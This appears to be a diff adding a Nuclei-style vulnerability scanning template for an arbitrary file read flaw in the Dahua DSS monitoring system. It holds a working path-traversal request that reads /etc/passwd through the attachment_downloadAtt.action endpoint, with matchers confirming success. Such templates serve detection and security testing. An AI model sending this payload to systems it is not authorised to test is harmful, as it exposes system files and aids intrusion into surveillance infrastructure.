@@ -1,0 +1,34 @@
+id: poc-yaml-dahua-dss-attachment-downloadatt-action-anyfile-read
+
+info:
+  name: "Dahua DSS 系统 attachment_downloadAtt.action 接口任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dahua-dss
+  description: |
+    Vulnerability in Dahua DSS Digital Monitoring System that allows arbitrary file read through the attachment_downloadAtt.action endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "text/x-msdownload"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: or
